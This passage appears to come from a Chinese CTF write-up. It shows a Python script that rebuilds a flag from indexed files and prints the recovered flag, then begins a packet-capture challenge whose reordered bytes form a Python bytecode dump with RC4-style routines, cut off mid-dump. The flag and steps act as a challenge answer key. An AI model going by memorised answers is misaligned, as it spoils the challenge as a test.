class="number">0x03E6</span>,<span class="number">0x03ED</span>,<span class="number">0x0318</span>,<span class="number">0x008C</span>,<span class="number">0x015A</span>,<span class="number">0x03BA</span>,<span class="number">0x03F6</span>,<span class="number">0x00AB</span>,<span class="number">0x0079</span>,<span class="number">0x0281</span>,<span class="number">0x00AF</span>,<span class="number">0x00EA</span>,<span class="number">0x01A2</span>,<span class="number">0x0127</span>,<span class="number">0x011C</span>,<span class="number">0x0056</span>,<span class="number">0x018F</span>,<span class="number">0x02BF</span>,<span class="number">0x0002</span>,<span class="number">0x0183</span>,<span class="number">0x03A1</span>,<span class="number">0x00CF</span>,<span class="number">0x013D</span>,<span class="number">0x029A</span>,<span class="number">0x031E</span>,<span class="number">0x0271</span>,<span class="number">0x0138</span>,<span class="number">0x0219</span>,<span class="number">0x0364</span>,<span class="number">0x0261</span>,<span class="number">0x0076</span>,<span class="number">0x01AB</span>,<span class="number">0x03E8</span>,<span class="number">0x00A5</span>,<span class="number">0x01EB</span>,<span class="number">0x03DD</span>,<span class="number">0x01A3</span>,<span class="number">0x0060</span>,<span class="number">0x0096</span>,<span class="number">0x017B</span>,<span class="number">0x007E</span>,<span class="number">0x01B3</span>,<span class="number">0x0354</span>,<span class="number">0x03E2</span>,<span class="number">0x012B</span>,<span class="number">0x0171</span>,<span class="number">0x03FC</span>,<span class="number">0x0009</span>,<span class="number">0x01C9</span>,<span class="number">0x01FC</span>,<span class="number">0x021E</span>,<span class="number">0x00B9</span>,<span class="number">0x032E</span>,<span class="number">0x02E4</span>,<span class="number">0x026C</span>,<span class="number">0x0085</span>,<span class="number">0x02D9</span>,<span class="number">0x02DF</span>,<span class="number">0x027A</span>,<span class="number">0x01AC</span>,<span class="number">0x03CE</span>,<span class="number">0x00E2</span>,<span class="number">0x0067</span>,<span class="number">0x0365</span>,<span class="number">0x0384</span>,<span class="number">0x01DC</span>,<span class="number">0x01F4</span>,<span class="number">0x0212</span>,<span class="number">0x0120</span>,<span class="number">0x00CD</span>,<span class="number">0x0221</span>,<span class="number">0x021B</span>,<span class="number">0x01DA</span>,<span class="number">0x0209</span>,<span class="number">0x013E</span>,<span class="number">0x031D</span>,<span class="number">0x005B</span>,<span class="number">0x0378</span>,<span class="number">0x016C</span>,<span class="number">0x0073</span>,<span class="number">0x00CA</span>,<span class="number">0x0255</span>,<span class="number">0x008D</span>,<span class="number">0x00C2</span>,<span class="number">0x0082</span>,<span class="number">0x009A</span>,<span class="number">0x0224</span>,<span class="number">0x001B</span>,<span class="number">0x0013</span>,<span class="number">0x0375</span>,<span class="number">0x0347</span>,<span class="number">0x0278</span>,<span class="number">0x01D6</span>,<span class="number">0x03D0</span>,<span class="number">0x00EF</span>,<span class="number">0x0371</span>,<span class="number">0x03EC</span>,<span class="number">0x002F</span>,<span class="number">0x03A0</span>,<span class="number">0x02B1</span>,<span class="number">0x03FA</span>,<span class="number">0x0025</span>,<span class="number">0x01D8</span>,<span class="number">0x004F</span>,<span class="number">0x01B1</span>,<span class="number">0x02C3</span>,<span class="number">0x029F</span>,<span class="number">0x0309</span>,<span class="number">0x02A4</span>,<span class="number">0x028B</span>,<span class="number">0x0093</span>,<span class="number">0x02BC</span>,<span class="number">0x00D5</span>,<span class="number">0x0288</span>,<span class="number">0x01B6</span>,<span class="number">0x00FF</span>,<span class="number">0x0114</span>,<span class="number">0x03F3</span>,<span class="number">0x030E</span>,<span class="number">0x021F</span>,<span class="number">0x0021</span>,<span class="number">0x00D6</span>,<span class="number">0x018D</span>,<span class="number">0x036F</span>,<span class="number">0x0321</span>,<span class="number">0x0353</span>,<span class="number">0x0029</span>,<span class="number">0x015B</span>,<span class="number">0x0346</span>,<span class="number">0x03D7</span>,<span class="number">0x034F</span>,<span class="number">0x0043</span>,<span class="number">0x0173</span>,<span class="number">0x03DB</span>,<span class="number">0x0160</span>,<span class="number">0x0292</span>,<span class="number">0x0392</span>,<span class="number">0x0337</span>,<span class="number">0x0030</span>,<span class="number">0x017F</span>,<span class="number">0x02F7</span>,<span class="number">0x0124</span>,<span class="number">0x003E</span>,<span class="number">0x02F6</span>,<span class="number">0x01AF</span>,<span class="number">0x010E</span>,<span class="number">0x039D</span>,<span class="number">0x0246</span>,<span class="number">0x0287</span>,<span class="number">0x01B9</span>,<span class="number">0x021A</span>,<span class="number">0x010C</span>,<span class="number">0x0394</span>,<span class="number">0x0250</span>,<span class="number">0x00F3</span>,<span class="number">0x03A2</span>,<span class="number">0x0000</span>,<span class="number">0x0116</span>,<span class="number">0x03AD</span>,<span class="number">0x0377</span>,<span class="number">0x011A</span>,<span class="number">0x02EF</span>,<span class="number">0x02CA</span>,<span class="number">0x0153</span>,<span class="number">0x0312</span>,<span class="number">0x01E8</span>,<span class="number">0x034A</span>,<span class="number">0x0311</span>,<span class="number">0x0229</span>,<span class="number">0x02AF</span>,<span class="number">0x03A5</span>,<span class="number">0x0359</span>,<span class="number">0x036D</span>,<span class="number">0x01A6</span>,<span class="number">0x023B</span>,<span class="number">0x021D</span>,<span class="number">0x00FA</span>,<span class="number">0x02D0</span>,<span class="number">0x0335</span>,<span class="number">0x00BD</span>,<span class="number">0x025F</span>,<span class="number">0x0326</span>,<span class="number">0x037F</span>,<span class="number">0x03A8</span>,<span class="number">0x01EA</span>,<span class="number">0x011B</span>,<span class="number">0x029E</span>,<span class="number">0x03CC</span>,<span class="number">0x0201</span>,<span class="number">0x038A</span>,<span class="number">0x016A</span>,<span class="number">0x0380</span>,<span class="number">0x0037</span>,<span class="number">0x013F</span>,<span class="number">0x0080</span>,<span class="number">0x029B</span>,<span class="number">0x01CA</span>,<span class="number">0x0253</span>,<span class="number">0x02E9</span>,<span class="number">0x0088</span>,<span class="number">0x0370</span>,<span class="number">0x01C8</span>,<span class="number">0x02F1</span>,<span class="number">0x03B3</span>,<span class="number">0x0205</span>,<span class="number">0x003A</span>,<span class="number">0x0317</span>,<span class="number">0x01AD</span>,<span class="number">0x0125</span>,<span class="number">0x0187</span>,<span class="number">0x0197</span>,<span class="number">0x0237</span>,<span class="number">0x014E</span>,<span class="number">0x025E</span>,<span class="number">0x036A</span>,<span class="number">0x011F</span>,<span class="number">0x020F</span>,<span class="number">0x00A9</span>,<span class="number">0x014C</span>,<span class="number">0x008E</span>,<span class="number">0x030C</span>,<span class="number">0x032B</span>,<span class="number">0x0052</span>,<span class="number">0x0141</span>,<span class="number">0x0355</span>,<span class="number">0x0297</span>,<span class="number">0x0295</span>,<span class="number">0x0275</span>,<span class="number">0x013A</span>,<span class="number">0x0350</span>,<span class="number">0x0157</span>,<span class="number">0x02AB</span>,<span class="number">0x03FF</span>,<span class="number">0x00F7</span>,<span class="number">0x0098</span>,<span class="number">0x00DD</span>,<span class="number">0x015E</span>,<span class="number">0x0387</span>,<span class="number">0x01E4</span>,<span class="number">0x0087</span>,<span class="number">0x0055</span>,<span class="number">0x0159</span>,<span class="number">0x013C</span>,<span class="number">0x0105</span>,<span class="number">0x019B</span>,<span class="number">0x01D1</span>,<span class="number">0x0194</span>,<span class="number">0x02CF</span>,<span class="number">0x0045</span>,<span class="number">0x02B0</span>,<span class="number">0x00C6</span>,<span class="number">0x0022</span>,<span class="number">0x026F</span>,<span class="number">0x01E0</span>,<span class="number">0x01DD</span>,<span class="number">0x033B</span>,<span class="number">0x03FD</span>,<span class="number">0x01D2</span>,<span class="number">0x0154</span>,<span class="number">0x005D</span>,<span class="number">0x0389</span>,<span class="number">0x0024</span>,<span class="number">0x039F</span>,<span class="number">0x01DF</span>,<span class="number">0x028D</span>,<span class="number">0x03BB</span>,<span class="number">0x0245</span>,<span class="number">0x0011</span>,<span class="number">0x0003</span>,<span class="number">0x0027</span>,<span class="number">0x00C7</span>,<span class="number">0x02BE</span>,<span class="number">0x0047</span>,<span class="number">0x00C9</span>,<span class="number">0x02B6</span>,<span class="number">0x01B5</span>,<span class="number">0x009B</span>,<span class="number">0x006E</span>,<span class="number">0x03C3</span>,<span class="number">0x016E</span>,<span class="number">0x00B5</span>,<span class="number">0x025D</span>,<span class="number">0x0059</span>,<span class="number">0x0016</span>,<span class="number">0x0008</span>,<span class="number">0x002D</span>,<span class="number">0x0066</span>,<span class="number">0x007A</span>,<span class="number">0x037B</span>,<span class="number">0x01BF</span>,<span class="number">0x0308</span>,<span class="number">0x02ED</span>,<span class="number">0x035C</span>,<span class="number">0x02CD</span>,<span class="number">0x00E5</span>,<span class="number">0x00C5</span>,<span class="number">0x0208</span>,<span class="number">0x02FB</span>,<span class="number">0x0280</span>,<span class="number">0x01CF</span>,<span class="number">0x025A</span>,<span class="number">0x03DA</span>,<span class="number">0x018B</span>,<span class="number">0x017A</span>,<span class="number">0x02B8</span>,<span class="number">0x0104</span>,<span class="number">0x0190</span>,<span class="number">0x003D</span>,<span class="number">0x03BD</span>,<span class="number">0x0089</span>,<span class="number">0x0204</span>,<span class="number">0x0391</span>,<span class="number">0x0289</span>,<span class="number">0x014F</span>,<span class="number">0x0274</span>,<span class="number">0x01C3</span>,<span class="number">0x0322</span>,<span class="number">0x0151</span>,<span class="number">0x0196</span>,<span class="number">0x02C2</span>,<span class="number">0x03D2</span>,<span class="number">0x03F7</span>,<span class="number">0x0294</span>,<span class="number">0x01D9</span>,<span class="number">0x00BA</span>,<span class="number">0x0158</span>,<span class="number">0x03FE</span>,<span class="number">0x03B1</span>,<span class="number">0x03B5</span>,<span class="number">0x01ED</span>,<span class="number">0x014D</span>,<span class="number">0x0136</span>,<span class="number">0x023A</span>,<span class="number">0x0042</span>,<span class="number">0x0374</span>,<span class="number">0x0315</span>,<span class="number">0x0395</span>,<span class="number">0x00E9</span>,<span class="number">0x0342</span>,<span class="number">0x00DE</span>,<span class="number">0x00D1</span>,<span class="number">0x01B2</span>,<span class="number">0x0340</span>,<span class="number">0x0020</span>,<span class="number">0x004E</span>,<span class="number">0x015C</span>,<span class="number">0x013B</span>,<span class="number">0x00AC</span>,<span class="number">0x0363</span>,<span class="number">0x02D4</span>,<span class="number">0x0223</span>,<span class="number">0x0026</span>,<span class="number">0x00DB</span>,<span class="number">0x017E</span>,<span class="number">0x0123</span>,<span class="number">0x006B</span>,<span class="number">0x02DD</span>,<span class="number">0x02FF</span>,<span class="number">0x0299</span>,<span class="number">0x00F1</span>,<span class="number">0x0084</span>,<span class="number">0x0217</span>,<span class="number">0x0014</span>,<span class="number">0x0090</span>,<span class="number">0x0176</span>,<span class="number">0x0206</span>,<span class="number">0x02B4</span>,<span class="number">0x023E</span>,<span class="number">0x0372</span>,<span class="number">0x032F</span>,<span class="number">0x023D</span>,<span class="number">0x01C0</span>,<span class="number">0x02E6</span>,<span class="number">0x0220</span>,<span class="number">0x0072</span>,<span class="number">0x02FE</span>,<span class="number">0x03C9</span>,<span class="number">0x01D0</span>,<span class="number">0x0053</span>,<span class="number">0x0329</span>,<span class="number">0x01C6</span>,<span class="number">0x033D</span>,<span class="number">0x027C</span>,<span class="number">0x03B9</span>,<span class="number">0x0369</span>,<span class="number">0x0028</span>,<span class="number">0x0050</span>,<span class="number">0x02DA</span>,<span class="number">0x00D9</span>,<span class="number">0x01E9</span>,<span class="number">0x001A</span>,<span class="number">0x02CB</span>,<span class="number">0x0172</span>,<span class="number">0x02E8</span>,<span class="number">0x0356</span>,<span class="number">0x0191</span>,<span class="number">0x02EE</span>,<span class="number">0x0095</span>,<span class="number">0x01C2</span>,<span class="number">0x0094</span>,<span class="number">0x007F</span>,<span class="number">0x0251</span>,<span class="number">0x0184</span>,<span class="number">0x0144</span>,<span class="number">0x024B</span>,<span class="number">0x03B0</span>,<span class="number">0x0121</span>,<span class="number">0x0203</span>,<span class="number">0x0264</span>,<span class="number">0x022E</span>,<span class="number">0x0348</span>,<span class="number">0x02FD</span>,<span class="number">0x0373</span>,<span class="number">0x0249</span>,<span class="number">0x0036</span>,<span class="number">0x02C8</span>,<span class="number">0x027B</span>,<span class="number">0x0226</span>,<span class="number">0x016D</span>,<span class="number">0x03C7</span>,<span class="number">0x0017</span>,<span class="number">0x0040</span>,<span class="number">0x0386</span>,<span class="number">0x0262</span>,<span class="number">0x0270</span>,<span class="number">0x0252</span>,<span class="number">0x02E5</span>,<span class="number">0x0234</span>,<span class="number">0x010F</span>,<span class="number">0x03C4</span>,<span class="number">0x010B</span>,<span class="number">0x0150</span>,<span class="number">0x0293</span>,<span class="number">0x02B9</span>,<span class="number">0x016F</span>,<span class="number">0x0382</span>,<span class="number">0x03AB</span>,<span class="number">0x0189</span>,<span class="number">0x02B7</span>,<span class="number">0x039B</span>,<span class="number">0x0146</span>,<span class="number">0x01F2</span>,<span class="number">0x030F</span>,<span class="number">0x00CB</span>,<span class="number">0x0054</span>,<span class="number">0x00C8</span>,<span class="number">0x01DB</span>,<span class="number">0x035E</span>,<span class="number">0x0388</span>,<span class="number">0x0083</span>,<span class="number">0x001D</span>,<span class="number">0x007B</span>,<span class="number">0x00FE</span>,<span class="number">0x0181</span>,<span class="number">0x010A</span>,<span class="number">0x0033</span>,<span class="number">0x01E2</span>,<span class="number">0x03C1</span>,<span class="number">0x03E4</span>,<span class="number">0x02FA</span>,<span class="number">0x0163</span>,<span class="number">0x0358</span>,<span class="number">0x0069</span>,<span class="number">0x00E7</span>,<span class="number">0x02E0</span>,<span class="number">0x017D</span>,<span class="number">0x00EE</span>,<span class="number">0x0290</span>,<span class="number">0x0166</span>,<span class="number">0x027E</span>,<span class="number">0x003B</span>,<span class="number">0x02F4</span>,<span class="number">0x00D3</span>,<span class="number">0x0341</span>,<span class="number">0x0279</span>,<span class="number">0x0179</span>,<span class="number">0x0228</span>,<span class="number">0x0152</span>,<span class="number">0x02B2</span>,<span class="number">0x036C</span>,<span class="number">0x0119</span>,<span class="number">0x0336</span>,<span class="number">0x03AA</span>,<span class="number">0x0174</span>,<span class="number">0x029D</span>,<span class="number">0x0117</span>,<span class="number">0x03A7</span>,<span class="number">0x023F</span>,<span class="number">0x02D6</span>,<span class="number">0x0218</span>,<span class="number">0x01FD</span>,<span class="number">0x0134</span>,<span class="number">0x0019</span>,<span class="number">0x02C0</span>,<span class="number">0x000D</span>,<span class="number">0x0161</span>,<span class="number">0x032D</span>,<span class="number">0x0010</span>,<span class="number">0x0149</span>,<span class="number">0x0167</span>,<span class="number">0x002E</span>,<span class="number">0x004B</span>,<span class="number">0x0200</span>,<span class="number">0x03C6</span>,<span class="number">0x0046</span>,<span class="number">0x00B3</span>,<span class="number">0x005A</span>,<span class="number">0x01D5</span>,<span class="number">0x0202</span>,<span class="number">0x0313</span>,<span class="number">0x0131</span>,<span class="number">0x012C</span>,<span class="number">0x0332</span>,<span class="number">0x00B2</span>,<span class="number">0x0213</span>,<span class="number">0x01A5</span>,<span class="number">0x02EA</span>,<span class="number">0x026A</span>,<span class="number">0x02D5</span>,<span class="number">0x000E</span>,<span class="number">0x007D</span>,<span class="number">0x03B2</span>,<span class="number">0x02C9</span>,<span class="number">0x00EB</span>,<span class="number">0x0031</span>,<span class="number">0x03D5</span>,<span class="number">0x00B4</span>,<span class="number">0x01E7</span>,<span class="number">0x00BC</span>,<span class="number">0x039A</span>,<span class="number">0x0155</span>,<span class="number">0x0367</span>,<span class="number">0x032A</span>,<span class="number">0x0156</span>,<span class="number">0x0303</span>,<span class="number">0x0285</span>,<span class="number">0x0351</span>,<span class="number">0x0258</span>,<span class="number">0x02D1</span>,<span class="number">0x00A7</span>,<span class="number">0x027F</span>,<span class="number">0x0112</span>,<span class="number">0x01EC</span>,<span class="number">0x0316</span>,<span class="number">0x02C6</span>,<span class="number">0x002B</span>,<span class="number">0x00A0</span>,<span class="number">0x0284</span>,<span class="number">0x0048</span>,<span class="number">0x00CE</span>,<span class="number">0x01E3</span>,<span class="number">0x0241</span>,<span class="number">0x00B0</span>,<span class="number">0x025C</span>,<span class="number">0x02A6</span>,<span class="number">0x01CC</span>,<span class="number">0x0306</span>,<span class="number">0x02C4</span>,<span class="number">0x00B1</span>,<span class="number">0x0240</span>,<span class="number">0x02E7</span>,<span class="number">0x03DF</span>,<span class="number">0x029C</span>,<span class="number">0x0331</span>,<span class="number">0x00DF</span>,<span class="number">0x0075</span>,<span class="number">0x0005</span>,<span class="number">0x006A</span>,<span class="number">0x03B7</span>,<span class="number">0x003F</span>,<span class="number">0x00D2</span>,<span class="number">0x01F3</span>,<span class="number">0x026B</span>,<span class="number">0x032C</span>,<span class="number">0x00FC</span>,<span class="number">0x0058</span>,<span class="number">0x01D4</span>,<span class="number">0x0393</span>,<span class="number">0x0324</span>,<span class="number">0x01AE</span>,<span class="number">0x038F</span>,<span class="number">0x018C</span>,<span class="number">0x01FE</span>,<span class="number">0x03C2</span>,<span class="number">0x0182</span>,<span class="number">0x015D</span>,<span class="number">0x00E6</span>,<span class="number">0x020D</span>,<span class="number">0x0175</span>,<span class="number">0x012D</span>,<span class="number">0x0032</span>,<span class="number">0x03CA</span>,<span class="number">0x02E1</span>,<span class="number">0x038B</span>,<span class="number">0x03D4</span>,<span class="number">0x0277</span>,<span class="number">0x02F9</span>,<span class="number">0x0257</span>,<span class="number">0x02A7</span>,<span class="number">0x031A</span>,<span class="number">0x00A4</span>,<span class="number">0x03DC</span>,<span class="number">0x01C5</span>,<span class="number">0x024C</span>,<span class="number">0x0211</span>,<span class="number">0x00C3</span>,<span class="number">0x0244</span>,<span class="number">0x001E</span>,<span class="number">0x022A</span>,<span class="number">0x0283</span>,<span class="number">0x027D</span>,<span class="number">0x035F</span>,<span class="number">0x00DC</span>,<span class="number">0x03A6</span>,<span class="number">0x0379</span>,<span class="number">0x033F</span>,<span class="number">0x0376</span>,<span class="number">0x00E8</span>,<span class="number">0x0118</span>,<span class="number">0x0145</span>,<span class="number">0x03D3</span>,<span class="number">0x0057</span>,<span class="number">0x000B</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> indexes:</span><br><span class="line">    fileName = <span class="string">f&quot;flag_f<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">int</span>(index)).zfill(<span class="number">5</span>)&#125;</span>&quot;</span></span><br><span class="line">    result += <span class="built_in">open</span>(fileName, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;b.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(result)</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行脚本可以得到如下包含 flag 的文本。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#39;n4)GwcPx8gp[6Z_&#39;.#Y(&#x3D;zCs&#x2F;2*^DwpC6@&#x3D;KBz\+0ngA@C(cJSiE&#39;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE&#96;pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#39;&amp;I2[36?&lt;k)N^Z0~IgP-k&#x3D;L-Ip0URu_&lt;P6T?&#x2F;LF\~K~q6%76&#125;!_WR&amp;nojVK&#96;KGYZwx&quot;G4^4&#x3D;&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z&#x2F;Xh&#x3D;V(J&#96;jus9Jw-Pmp1&#x3D;[|b5;&quot;Z&#123;[qNI&amp;9&#x2F;.2@b&gt;&#39;Vxo &#123;1)xT_&#39;3FoRIP~O&#96;&amp;!K&#39;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j&#x2F;]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!&#x2F;bbB(v&#x2F;Q(6ez&#123;bKoH&#39;-B&#39;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+&#96;abDa7w16BySRx-#D&#x2F;-a1O55Q&#96;F&lt;75&#123;8f)4rlgQW]K&#x3D;oT1J$Ar&#x3D; W$LW9!~TphteN&#x3D;b&amp;s&#125;.714G_8W~!@8&#x3D;%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#39;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#39;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#39;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:&#x2F;q?8:jmcI|4L:+&#96;KDx])5+A_m13&#x2F;7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#39;f:.&lt;,bO~0r,&#x3D;olgKP&amp;x U %(HFjNtCDaJiHW+N1WK&#x3D;(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn&#x3D;k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn&#96;n;YI9[M&#39;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#39;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Dir3ct0ry_jYa_n41&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ExtremelySlow"><a href="#ExtremelySlow" class="headerlink" title="ExtremelySlow"></a>ExtremelySlow</h3><p>追踪 TCP 流可见响应中含有 <code>content-range: bytes 641-641/1987</code> 提示了字符顺序。使用 WireShark 导出分组解析结果后使用正则表达式将内容和顺序提取出来，放到 Excel 中排好序，可以得到如下内容。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f 0d 0d 0a 00 00 00 00 af e7 b5 60 9a 06 00 00 e3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 00 00 00 40 00 00 00 73 1a 01 00 00 64 00 64 01 6c 00 5a 00 64 00 64 02 6c 01 6d 02 5a 02 01 00 64 03 64 04 84 00 5a 03 64 05 64 06 84 00 5a 04 64 07 64 08 84 00 5a 05 64 09 64 0a 84 00 5a 06 65 07 64 0b 6b 02 72 8b 64 0c 5a 08 64 0d 5a 09 64 0e 5a 0a 64 0f 5a 0b 64 10 5a 0c 64 11 64 12 64 13 64 14 64 15 9c 04 5a 0d 64 16 64 17 64 18 64 19 64 1a 9c 04 5a 0e 65 0d 64 1b 64 1c 84 00 65 0e 44 00 83 01 4f 00 5a 0d 65 0d 64 1d 64 1e 84 00 65 0a 44 00 83 01 4f 00 5a 0d 65 05 65 0f 65 10 64 1f 64 20 84 00 65 11 65 0d a0 12 a1 00 83 01 83 02 83 01 83 01 5a 13 65 14 65 06 65 08 65 13 83 02 a0 15 a1 00 83 01 01 00 65 00 6a 16 6a 17 a0 18 a1 00 5a 19 65 06 65 09 65 13 83 02 5a 09 65 06 65 19 65 13 83 02 5a 1a 65 02 65 1a 83 01 a0 1b a1 00 65 0b 6b 02 72 83 65 14 65 06 65 0c 65 13 83 02 a0 15 a1 00 83 01 01 00 64 01 53 00 65 14 65 09 a0 15 a1 00 83 01 01 00 64 01 53 00 64 01 53 00 29 21 e9 00 00 00 00 4e a9 01 da 06 73 68 61 32 35 36 63 01 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 05 00 00 00 43 00 00 00 73 60 00 00 00 74 00 7c 00 83 01 7d 01 74 01 74 02 64 01 83 01 83 01 7d 02 64 02 7d 03 74 02 64 01 83 01 44 00 5d 1d 7d 04 7c 03 7c 02 7c 04 19 00 17 00 7c 00 7c 04 7c 01 16 00 19 00 17 00 64 01 16 00 7d 03 7c 02 7c 03 19 00 7c 02 7c 04 19 00 02 00 7c 02 7c 04 3c 00 7c 02 7c 03 3c 00 71 10 7c 02 53 00 29 03 4e e9 00 01 00 00 72 01 00 00 00 29 03 da 03 6c 65 6e da 04 6c 69 73 74 da 05 72 61 6e 67 65 29 05 da 03 6b 65 79 da 09 6b 65 79 6c 65 6e 67 74 68 da 01 53 da 01 6a da 01 69 a9 00 72 0d 00 00 00 fa 07 6d 61 69 6e 2e 70 79 da 03 4b 53 41 06 00 00 00 73 0e 00 00 00 00 01 08 01 0c 01 04 01 0c 01 1c 01 1c 01 72 0f 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00 63 00 00 00 73 62 00 00 00 81 00 64 01 7d 01 64 01 7d 02 09 f0 7c 01 64 03 17 b4 64 04 16 55 7d 01 7c 02 7c 00 7c 01 19 16 17 36 64 04 16 c5 7d 02 7c 00 7c 02 19 6f 7c 00 7c 01 19 db 02 c9 7c 00 7c 01 3c ea 7c 00 7c 02 3c 64 7c 00 7c 00 7c 01 19 04 7c 00 7c 02 19 15 17 62 64 04 16 00 19 00 7d 03 7c 03 56 00 01 00 71 06 29 05 4e 72 01 00 00 00 54 e9 01 00 00 00 72 04 00 00 00 72 0d 00 00 00 29 04 72 0a 00 00 00 72 0c 00 00 00 72 0b 00 00 00 da 01 4b 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 04 50 52 47 41 10 00 00 00 73 12 00 00 00 02 01 04 01 04 01 02 01 0c 01 10 01 1a 01 18 01 06 fb 72 12 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 02 00 00 00 43 00 00 00 73 10 00 00 00 74 00 7c 00 83 01 7d 01 74 01 7c 01 83 01 53 11 29 01 4e 29 02 72 0f 00 00 00 72 12 00 00 00 29 02 72 08 00 00 00 72 0a 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 03 52 43 34 1a 00 00 00 73 04 00 00 00 00 01 08 01 72 13 00 00 00 63 02 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 05 00 00 00 03 00 00 00 73 16 00 00 00 74 00 74 01 87 00 66 01 64 01 64 02 84 08 7c 00 83 02 83 01 53 a2 29 03 4e 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 03 00 00 00 13 00 00 00 73 0c 00 00 00 7c 00 88 00 a0 00 a1 00 41 b0 53 cd 29 01 4e 29 01 da 08 5f 5f 6e 65 78 74 5f 5f 29 01 da 01 78 29 01 da 06 73 74 72 65 61 6d 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6c 61 6d 62 64 61 3e 1f 00 00 00 f3 00 00 00 00 fa 15 78 6f 72 2e 3c 6c 6f 63 61 6c 73 3e 2e 3c 6c 61 6d 62 64 61 3e 29 02 da 05 62 79 74 65 73 da 03 6d 61 70 29 02 da 01 70 72 16 00 00 00 72 0d 00 00 00 29 01 72 16 00 00 00 72 0e 00 00 00 da 03 78 6f 72 1e 00 00 00 73 02 00 00 00 00 01 72 1d 00 00 00 da 08 5f 5f 6d 61 69 6e 5f 5f f3 1c 00 00 00 f6 ef 10 48 a9 0f 9f b5 80 c1 78 64 ae d3 03 b2 84 c2 b4 0e c8 f3 3c 15 31 19 0a 8f f3 0e 00 00 00 24 0d 39 a3 18 dd 57 c9 97 f3 a7 a8 52 7e f3 03 00 00 00 67 65 6f f3 20 00 00 00 7d ce 60 be 6a a2 12 30 b5 8a 94 14 7b a3 86 c8 c7 01 98 a3 5f 91 d8 82 54 2a 56 ab e0 a1 14 31 f3 34 00 00 00 51 5f e2 f8 8c 11 4d 7d 27 3c 40 ce 54 f6 3f 5f 6d a4 f8 b4 ea ca c7 3a b9 e6 06 8b eb fa 62 48 85 78 4a 33 24 dd de b6 dc a0 b8 62 96 31 b7 13 3d 17 13 b1 e9 73 00 00 00 e9 61 00 00 00 e9 75 00 00 00 e9 72 00 00 00 a9 04 e9 02 00 00 00 e9 08 00 00 00 e9 0b 00 00 00 e9 0a 00 00 00 e9 77 00 00 00 e9 74 00 00 00 e9 7c 00 00 00 e9 7f 00 00 00 a9 04 e9 03 00 00 00 e9 07 00 00 00 e9 09 00 00 00 e9 0c 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 06 00 00 00 43 00 00 00 73 1a 00 00 00 69 00 7c 00 5d 09 7d 01 7c 01 7c 01 74 00 7c 01 19 f0 41 7d 93 02 71 02 53 49 72 0d 00 00 00 29 01 da 01 6e 29 02 da 02 2e 30 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 0a 3c 64 69 63 74 63 6f 6d 70 3e 2c 00 00 00 72 18 00 00 00 72 38 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 03 00 00 00 63 00 00 00 73 1c 00 00 00 81 00 7c 00 5d 09 7d 01 7c 01 a0 00 a1 00 7c 01 66 02 56 32 01 d6 71 02 64 00 53 22 29 01 4e 29 01 da 09 62 69 74 5f 63 6f 75 6e 74 29 02 72 37 00 00 00 72 0c 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 09 3c 67 65 6e 65 78 70 72 3e 2d 00 00 00 72 18 00 00 00 72 3a 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 43 00 00 00 73 08 00 00 00 7c 00 64 01 19 e5 53 0a 29 02 4e 72 10 00 00 00 72 0d 00 00 00 29 01 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 72 17 00 00 00 2f 00 00 00 72 18 00 00 00 72 17 00 00 00 29 1c da 03 73 79 73 da 07 